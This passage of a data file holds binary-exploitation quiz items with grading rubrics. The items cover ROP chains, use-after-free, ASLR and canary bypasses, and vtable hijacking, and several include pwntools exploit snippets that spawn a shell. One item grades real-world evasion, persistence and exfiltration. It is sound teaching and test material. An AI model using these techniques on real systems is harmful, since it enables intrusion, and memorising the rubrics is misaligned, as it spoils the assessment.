      { id: "syscall-number", description: "Explains mov al avoids null bytes that mov rax, 0x3b would include in the encoding", points: 1, keywords: ["mov al", "partial register", "encoding", "smaller", "no null"], check: "Student explains the partial register write for the syscall number" },
    ],
    gaps: [
      { if_missing: "null-byte-avoidance", gap: "Does not understand shellcode constraints — study bad characters and their impact on payload delivery" },
      { if_missing: "stack-string", gap: "Missing stack-based string techniques — practice writing null-free shellcode" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "rop-chains",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `An exploit developer's ROP chain for a CTF challenge crashes. The binary has NX and ASLR is disabled. Their exploit:\n\n\`\`\`python\nfrom pwn import *\n\nelf = ELF('./vuln')\np = process('./vuln')\n\n# Gadgets found with ROPgadget\npop_rdi = 0x401203  # pop rdi; ret\npop_rsi = 0x401205  # pop rsi; pop r15; ret\n\n# ROP chain to call read(0, bss, 100) then execute bss\npayload = b'A' * 72\npayload += p64(pop_rdi)\npayload += p64(0)           # fd = stdin\npayload += p64(pop_rsi)\npayload += p64(elf.bss())   # buf = .bss section\n# Missing: rdx not set!\npayload += p64(elf.plt['read'])\npayload += p64(elf.bss())   # jump to shellcode\n\np.sendline(payload)\np.sendline(asm(shellcraft.sh()))\np.interactive()\n\`\`\`\n\nIdentify why the exploit crashes. Fix the missing rdx setup, the .bss execution issue (NX on .bss), and suggest an alternative approach using mprotect to make .bss executable.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "missing-rdx", description: "Identifies rdx (third argument: length) is not set — needs a pop rdx gadget or csu_init technique", points: 2, keywords: ["rdx", "third argument", "not set", "pop rdx", "csu_init", "__libc_csu_init"], check: "Student identifies the missing rdx setup" },
      { id: "bss-nx", description: "Notes .bss is also non-executable with NX — cannot jump to shellcode there", points: 2, keywords: [".bss", "non-executable", "NX", "cannot execute", "data section"], check: "Student identifies that .bss is also non-executable" },
      { id: "mprotect-fix", description: "Proposes using mprotect to make .bss executable before jumping to it", points: 2, keywords: ["mprotect", "PROT_EXEC", "PROT_READ", "PROT_WRITE", "executable", "change permissions"], check: "Student proposes mprotect as the fix" },
      { id: "sendline-bug", description: "Notes sendline adds a newline which corrupts the ROP chain — should use send", points: 2, keywords: ["sendline", "newline", "send", "corrupt", "\\n", "extra byte"], check: "Student identifies the sendline/send bug" },
    ],
    gaps: [
      { if_missing: "missing-rdx", gap: "Does not track register state in ROP chains — study x86-64 calling convention for all arguments" },
      { if_missing: "mprotect-fix", gap: "Missing mprotect knowledge — study how to change memory permissions at runtime" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "heap-exploitation",
  questionType: "fix_code",
  difficulty: 4,
  questionText:
    `This program has a use-after-free vulnerability. The exploit attempt fails:\n\n\`\`\`c\ntypedef struct {\n    void (*handler)(char *);\n    char name[32];\n} User;\n\nvoid admin_shell(char *arg) { system("/bin/sh"); }\n\n// In the exploit:\nUser *u1 = malloc(sizeof(User));   // allocate user\nu1->handler = normal_handler;\nstrcpy(u1->name, "alice");\n\nfree(u1);                          // free user\n\n// Attacker allocates same-sized chunk\nchar *evil = malloc(sizeof(User)); // should get u1's chunk\nmemcpy(evil, &admin_shell, 8);     // overwrite handler pointer\n\nu1->handler("pwned");              // use-after-free: calls admin_shell?\n\`\`\`\n\nExplain why malloc might not return the same chunk as u1. What heap allocator behavior does this exploit rely on? How do tcache and fastbins affect this? Fix the exploit to reliably trigger the UAF.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "uaf-mechanism", description: "Explains use-after-free: freed pointer u1 still used, attacker controls the memory via new allocation", points: 2, keywords: ["use-after-free", "dangling pointer", "freed", "reused", "control"], check: "Student explains the UAF mechanism" },
      { id: "tcache-bins", description: "Explains tcache/fastbins use LIFO ordering — last freed chunk is first returned by same-size malloc", points: 2, keywords: ["tcache", "fastbin", "LIFO", "same size", "last freed", "first allocated"], check: "Student explains tcache/fastbin LIFO behavior" },
      { id: "size-match", description: "Notes malloc must request the exact same size to get the freed chunk back from the cache", points: 2, keywords: ["same size", "size class", "bin", "match", "alignment"], check: "Student identifies the size-matching requirement" },
      { id: "reliability-fix", description: "Suggests ensuring same size allocation, draining tcache if needed, and verifying the chunk address", points: 3, keywords: ["same size", "drain tcache", "verify", "reliable", "spray", "deterministic"], check: "Student provides techniques for reliable exploitation" },
    ],
    gaps: [
      { if_missing: "tcache-bins", gap: "Does not understand heap allocator internals — study glibc malloc tcache and bin structures" },
      { if_missing: "size-match", gap: "Missing heap chunk allocation knowledge — practice heap exploitation challenges" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "aslr-bypass",
  questionType: "fix_code",
  difficulty: 4,
  questionText:
    `An exploit works locally but fails remotely because the server has ASLR enabled. The exploit currently hardcodes libc addresses:\n\n\`\`\`python\nfrom pwn import *\n\np = remote('target', 1337)\n\n# These addresses change every run with ASLR!\nsystem_addr = 0x7f1234560000 + 0x4f440\nbinsh_addr  = 0x7f1234560000 + 0x1b3e9a\n\n# Send overflow with hardcoded addresses (fails with ASLR)\npayload = b'A' * 72\npayload += p64(pop_rdi)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\np.sendline(payload)\n\`\`\`\n\nExplain what ASLR does and why the exploit fails. Describe two different approaches to bypass ASLR: (1) leaking a libc address at runtime, and (2) using a partial overwrite. Implement approach (1) by adding a first-stage ROP chain that leaks a GOT entry.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "aslr-explained", description: "Explains ASLR randomizes library base addresses each execution, breaking hardcoded addresses", points: 2, keywords: ["ASLR", "randomize", "base address", "different each time", "unpredictable"], check: "Student explains ASLR's effect on the exploit" },
      { id: "leak-approach", description: "Describes leaking a GOT entry via puts/write ROP chain to compute libc base at runtime", points: 3, keywords: ["leak", "GOT", "puts", "write", "libc base", "calculate", "offset"], check: "Student designs a libc address leak using a ROP chain" },
      { id: "partial-overwrite", description: "Explains partial overwrite: overwriting only the lowest bytes of a return address (which are not randomized)", points: 2, keywords: ["partial overwrite", "lowest bytes", "12 bits", "page offset", "not randomized"], check: "Student explains the partial overwrite ASLR bypass" },
      { id: "two-stage", description: "Implements a two-stage exploit: stage 1 leaks, stage 2 uses calculated addresses", points: 2, keywords: ["two stage", "return to main", "loop", "second payload", "calculated"], check: "Student implements a two-stage exploit structure" },
    ],
    gaps: [
      { if_missing: "leak-approach", gap: "Cannot bypass ASLR — study information leaking techniques for runtime address disclosure" },
      { if_missing: "two-stage", gap: "Missing multi-stage exploit knowledge — study chained exploit stages" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "exploit-mitigations",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You are exploiting a binary with all modern mitigations enabled:\n\n\`\`\`\nArch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\nFORTIFY:  Enabled\n\`\`\`\n\nThe binary has a buffer overflow in a function that reads user input. Design an exploitation strategy that addresses each mitigation. For each protection, explain exactly what it prevents and your technique to bypass or work around it. What additional information or vulnerabilities would you need?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "canary-bypass-strategy", description: "Proposes canary bypass: brute force (fork server), leak via format string/info disclosure", points: 2, keywords: ["canary", "leak", "brute force", "fork", "info disclosure", "format string"], check: "Student proposes a viable canary bypass strategy" },
      { id: "pie-bypass", description: "Addresses PIE: needs info leak to discover binary base address, or partial overwrite", points: 2, keywords: ["PIE", "base address", "info leak", "partial overwrite", "code base"], check: "Student addresses PIE with an information leak strategy" },
      { id: "full-relro", description: "Notes Full RELRO prevents GOT overwrite — must use alternative targets (stack, hooks, vtable)", points: 2, keywords: ["Full RELRO", "GOT read-only", "alternative", "__malloc_hook", "vtable", "stack"], check: "Student identifies Full RELRO impact and alternative write targets" },
      { id: "exploit-chain", description: "Designs a coherent multi-stage exploit chain that addresses all mitigations together", points: 2, keywords: ["chain", "multi-stage", "first leak", "then overflow", "combined", "sequence"], check: "Student synthesizes individual bypasses into a coherent chain" },
      { id: "additional-vulns", description: "Identifies what additional bugs would be needed: info leak, second vulnerability, specific binary features", points: 2, keywords: ["additional", "second bug", "info leak", "format string", "needed", "requirement"], check: "Student identifies prerequisites for the attack" },
    ],
    gaps: [
      { if_missing: "exploit-chain", gap: "Cannot synthesize individual bypasses — practice exploiting binaries with multiple mitigations" },
      { if_missing: "full-relro", gap: "Missing Full RELRO impact knowledge — study alternative write targets when GOT is read-only" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "exploit-development",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `Design a complete exploit for this scenario:\n\n- x86-64 Linux server binary (no source code available)\n- ASLR and PIE enabled, NX enabled, stack canary\n- The binary is a forking server (parent stays alive, children handle connections)\n- You have discovered a stack buffer overflow in the child process handler\n- No format string or other info leak vulnerabilities found\n\nThe forking behavior means the canary and ASLR layout are the same for every child process. Design a multi-stage blind exploitation approach:\n1. How do you leak the canary byte-by-byte?\n2. How do you leak the PIE base?\n3. How do you achieve code execution?\n\nProvide the algorithm for each stage and estimate the number of connections needed.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "fork-property", description: "Explains fork preserves the parent's memory layout — canary and ASLR are constant across children", points: 2, keywords: ["fork", "constant", "same layout", "preserved", "children", "parent"], check: "Student explains why fork makes blind brute force viable" },
      { id: "canary-bruteforce", description: "Describes byte-by-byte canary brute force: 256 attempts per byte, ~2048 connections for 8 bytes", points: 3, keywords: ["byte-by-byte", "256", "brute force", "crash", "no crash", "2048", "8 bytes"], check: "Student describes the byte-by-byte canary brute force algorithm" },
      { id: "pie-leak", description: "After canary, uses similar byte-by-byte technique on return address to leak PIE base", points: 2, keywords: ["return address", "PIE base", "byte-by-byte", "leak", "offset"], check: "Student extends the brute force to leak PIE base address" },
      { id: "final-exploit", description: "With canary and PIE known, constructs a final ROP payload using the leaked addresses", points: 3, keywords: ["ROP", "final payload", "known addresses", "canary", "PIE base", "libc"], check: "Student describes the final exploitation stage with known values" },
    ],
    gaps: [
      { if_missing: "canary-bruteforce", gap: "Does not know blind brute force on forking servers — study byte-by-byte canary leaking" },
      { if_missing: "fork-property", gap: "Missing understanding of fork's impact on exploitability — study process forking and address space inheritance" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "protections-comparison",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare these exploit mitigation technologies:\n\n1. Stack canaries (StackGuard / SSP)\n2. ASLR (Address Space Layout Randomization)\n3. NX/DEP (Non-executable stack/data)\n4. CFI (Control Flow Integrity)\n5. Shadow stacks (Intel CET)\n\nFor each: What specific attack does it prevent? What is its performance cost? How can it be bypassed? Which combinations of protections are most effective together? Rate each on a scale of "easily bypassed" to "research-level bypass required."`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "attack-coverage", description: "Correctly maps each mitigation to the specific attack it prevents", points: 2, keywords: ["prevents", "stack overflow", "code injection", "code reuse", "ROP", "JOP"], check: "Student correctly maps each mitigation to its target attack" },
      { id: "bypass-methods", description: "Describes bypass methods: canary leak, info leak for ASLR, ROP for NX, JOP/COOP for CFI", points: 2, keywords: ["leak", "info disclosure", "ROP", "JOP", "COOP", "bypass"], check: "Student describes known bypass methods for each mitigation" },
      { id: "performance", description: "Compares performance costs: canary and NX negligible, ASLR free, CFI and shadow stacks have overhead", points: 2, keywords: ["performance", "overhead", "negligible", "free", "cost", "runtime"], check: "Student evaluates performance tradeoffs" },
      { id: "synergy", description: "Explains which combinations provide defense-in-depth (e.g., ASLR + NX + CFI is very strong)", points: 3, keywords: ["combination", "defense in depth", "synergy", "together", "layered", "complementary"], check: "Student identifies which combinations are most effective together" },
    ],
    gaps: [
      { if_missing: "bypass-methods", gap: "Limited knowledge of mitigation bypasses — study the arms race between mitigations and exploitation techniques" },
      { if_missing: "synergy", gap: "Does not understand defense-in-depth — study how mitigations complement each other" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "real-world-exploitation",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText:
    `Compare exploitation in a CTF environment versus real-world vulnerability exploitation:\n\n1. Target knowledge: How does having source code, debug symbols, and a clean environment differ from a production target?\n2. Reliability: Why do CTF exploits often work first try but real exploits need spray techniques?\n3. Mitigations: CTF binaries often have selective mitigations disabled — how does exploiting a fully hardened production binary differ?\n4. Detection: CTF has no SOC watching — how does exploit development change when you must avoid detection?\n5. Impact: CTF captures a flag — real exploitation requires post-exploitation and persistence.\n\nFor each dimension, give a concrete example of how the approach must change.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "knowledge-gap", description: "Contrasts CTF's full knowledge with real-world black-box requiring reverse engineering and fuzzing", points: 2, keywords: ["black box", "reverse engineering", "fuzzing", "no source", "debug", "symbols"], check: "Student contrasts the knowledge gap between CTF and real-world" },
      { id: "reliability-difference", description: "Explains real-world needs reliability engineering: heap spraying, timing windows, race conditions", points: 2, keywords: ["reliability", "heap spray", "timing", "race condition", "spray", "probabilistic"], check: "Student explains why real-world exploits need reliability techniques" },
      { id: "full-hardening", description: "Describes exploiting fully hardened binaries: needs bug chains, info leaks, and novel techniques", points: 2, keywords: ["full hardening", "bug chain", "novel", "chain vulnerabilities", "0-day"], check: "Student describes the challenge of fully hardened targets" },
      { id: "opsec", description: "Discusses operational security: avoiding IDS/IPS, EDR, crash logs, and maintaining stealth", points: 2, keywords: ["OPSEC", "stealth", "IDS", "EDR", "crash", "detection", "avoid"], check: "Student addresses the detection avoidance dimension" },
      { id: "post-exploitation", description: "Covers real-world post-exploitation: persistence, lateral movement, data exfiltration vs. flag capture", points: 2, keywords: ["post-exploitation", "persistence", "lateral movement", "exfiltration", "beyond flag"], check: "Student addresses post-exploitation requirements" },
    ],
    gaps: [
      { if_missing: "reliability-difference", gap: "Limited to CTF-style exploitation — study reliability engineering for real-world exploits" },
      { if_missing: "opsec", gap: "Does not consider operational security in exploitation — study covert exploit deployment" },
    ],
  },
},

{
  competencyId: "binexp",
  subTopic: "use-after-free",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `You discover a use-after-free vulnerability in a C++ application that uses virtual function tables (vtables). The freed object had a vtable pointer at offset 0 and user-controlled data starting at offset 8.\n\nDesign a complete exploitation strategy:\n1. How do vtable-based exploits work? What happens when a virtual method is called on a freed object whose memory has been reallocated?\n2. How would you create a fake vtable in controlled memory?\n3. How does heap feng shui help you control what occupies the freed chunk?\n4. If the binary has CFI (Control Flow Integrity) checking vtable pointers, how would you adapt your approach?\n\nInclude the memory layout diagrams for the original object, the freed state, and the attacker-controlled replacement.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "vtable-mechanics", description: "Explains vtable pointer at object start, virtual call dereferences vtable then function pointer", points: 2, keywords: ["vtable", "virtual", "function pointer", "dereference", "indirect call", "offset"], check: "Student correctly explains vtable dispatch mechanics" },
      { id: "fake-vtable", description: "Describes crafting a fake vtable with controlled function pointers to redirect execution", points: 2, keywords: ["fake vtable", "controlled", "function pointer", "redirect", "craft", "spray"], check: "Student describes creating a fake vtable" },
      { id: "heap-feng-shui", description: "Explains heap feng shui: strategic alloc/free sequences to control which allocation fills the freed chunk", points: 3, keywords: ["heap feng shui", "allocation", "fill", "same size", "deterministic", "spray", "sequence"], check: "Student describes heap layout manipulation technique" },
      { id: "cfi-bypass", description: "Addresses CFI by targeting data-only corruption, DOP, or finding valid vtable entries that chain to useful gadgets", points: 3, keywords: ["CFI", "data-only", "DOP", "valid vtable", "bypass", "counterfeit", "COOP"], check: "Student proposes viable CFI bypass strategies" },
    ],
    gaps: [
      { if_missing: "heap-feng-shui", gap: "Missing heap manipulation skills — study heap feng shui and deterministic exploitation techniques" },
      { if_missing: "cfi-bypass", gap: "Does not know CFI bypass techniques — study counterfeit object-oriented programming (COOP) and data-oriented programming (DOP)" },
    ],
  },
},

];
